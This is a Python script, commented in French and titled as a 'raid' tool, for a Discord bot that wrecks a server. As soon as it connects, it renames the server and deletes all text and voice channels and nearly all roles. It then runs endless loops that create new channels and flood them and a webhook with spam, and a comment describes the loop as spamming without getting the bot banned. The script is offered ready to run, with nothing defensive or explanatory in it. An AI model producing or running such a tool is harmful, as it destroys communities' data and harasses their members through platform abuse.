#################################################################
#                                                               #            
#                      RAIDS GTAMOON                          #
#                       BY IFAVARO                              #
#                                                               #
#################################################################

############################### IMPORTS ##########################################
####################   NE PAS TOUCHER A CE CODE   ################################
##################################################################################
from discord.ext import commands, tasks
from Config import *
import requests
import discord
import asyncio

bot = commands.Bot(command_prefix="!")


############ SUPRETION DES SALONS ET VOCAUX ################
async def delete_all_channels(guild):
    for channel in guild.text_channels:
        try:
            await channel.delete()
            print(f"Salon textuel '{channel.name}' supprimé.")
        except discord.Forbidden:
            print(f"Impossible de supprimer le salon textuel '{channel.name}' (pas assez de permissions).")
        except Exception as e:
            print(f"Erreur lors de la suppression du salon '{channel.name}': {e}")

    for channel in guild.voice_channels:
        try:
            await channel.delete()
            print(f"Salon vocal '{channel.name}' supprimé.")
        except discord.Forbidden:
            print(f"Impossible de supprimer le salon vocal '{channel.name}' (pas assez de permissions).")
        except Exception as e:
            print(f"Erreur lors de la suppression du salon vocal '{channel.name}': {e}")

########### SUPRESSION DES ROLES ##########
async def delete_all_roles(guild):
    for role in guild.roles:
        if role.name != "@everyone" and role != guild.me.top_role:
            try:
                await role.delete()
                print(f"Rôle '{role.name}' supprimé.")
            except discord.Forbidden:
                print(f"Impossible de supprimer le rôle '{role.name}' (pas assez de permissions).")
            except Exception as e:
                print(f"Erreur lors de la suppression du rôle '{role.name}': {e}")

########### ENVOI DE MESSAGES WEBHOOK DANS CHAQUE SALONS ##########
async def spam_in_new_channels(guild, content):
    new_channels = [channel for channel in guild.text_channels if channel.name.startswith("new-")]
    
    for channel in new_channels:
        try:
            await channel.send(content)
            print(f"Message envoyé dans le salon '{channel.name}'")
        except discord.Forbidden:
            print(f"Impossible d'envoyer un message dans le salon '{channel.name}' (pas assez de permissions).")
        except Exception as e:
            print(f"Erreur lors de l'envoi du message dans le salon '{channel.name}': {e}")

########### ENVOI DE MESSAGES WEBHOOK ##########
def send_webhook_message(content, bot_name, avatar_url):
    payload = {
        'content': content,
        'username': bot_name,
        'avatar_url': avatar_url,
    }
    try:
        response = requests.post(WEBHOOK_URL, json=payload)
        if response.status_code == 200:
            print("Message envoyé avec succès via webhook.")
        else:
            print(f"Erreur : {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Erreur de connexion au webhook: {e}")

###### CREATION DES SALONS  ######
async def create_text_channel(guild, channel_name):
    await guild.create_text_channel(channel_name)
    print(f"Salon textuel '{channel_name}' créé.")

####### CREATION DES SALONS VOCAL ########
async def create_voice_channel(guild, channel_name):
    await guild.create_voice_channel(channel_name)
    print(f"Salon vocal '{channel_name}' créé.")

########## SPAMMER SANS SE FAIRE BAN LE BOT ##########
@tasks.loop(seconds=timeout_vocal)
async def spam_and_create_channels():
    guild = bot.guilds[0]

    await create_text_channel(guild, text_channel)
    await create_voice_channel(guild, vocal_channel)

    await asyncio.sleep(2)

    await spam_in_new_channels(guild, content)

########## CHANGER LE NOM DU SERVEUR ##########
async def change_server_name(guild, SERVER_NAME):
    try:
        await guild.edit(name=SERVER_NAME)
        print(f"Le nom du serveur a été changé en '{SERVER_NAME}'.")
    except discord.Forbidden:
        print(f"Impossible de changer le nom du serveur (pas assez de permissions).")
    except Exception as e:
        print(f"Erreur lors du changement de nom du serveur : {e}")

####### LANCER LE BOT ET LES TACHES ##########
@bot.event
async def on_ready():
    guild = bot.guilds[0]  # Récupérer le premier serveur auquel le bot est connecté

    # Changer le nom du serveur
    await change_server_name(guild, SERVER_NAME)

    print(f"Bot connecté : {bot.user}")

    # Supprimer tous les salons et rôles
    await delete_all_channels(guild)
    await delete_all_roles(guild)

    # Spam dans les nouveaux salons et lancement des tâches
    await spam_in_new_channels(guild, content)

    # Lancer les tâches pour spammer et créer des salons
    spam_and_create_channels.start()
    spam_messages.start()



########## SPAMMER DES MESSAGES ##########
@tasks.loop(seconds=timeout_message)
async def spam_messages():
    send_webhook_message(content, BOT_NAME, AVATAR_URL)

###### NE PAS TOUCHER A CE CODE ######
bot.run(BOT_TOKEN)
